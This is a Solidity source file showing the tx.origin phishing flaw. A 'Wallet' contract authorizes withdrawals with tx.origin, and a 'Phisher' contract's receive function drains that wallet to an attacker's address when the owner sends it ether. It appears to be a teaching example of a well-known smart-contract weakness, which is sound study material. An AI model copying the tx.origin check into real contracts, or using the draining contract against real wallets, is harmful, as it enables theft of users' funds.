//SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

contract Wallet {
  address public _owner;

  constructor(address owner) {
    _owner = owner;
  }

  receive() external payable {}

  function withdrawAll(address payable recipient) public {
    require(tx.origin == _owner);
    recipient.transfer(address(this).balance);
  }
}

contract Phisher {
  Wallet private _attackableWallet;
  address private _attacker;

  constructor(Wallet wallet, address attacker) {
    _attackableWallet = wallet;
    _attacker = attacker;
  }

  receive() external payable {
    _attackableWallet.withdrawAll(payable(_attacker));
  }
}
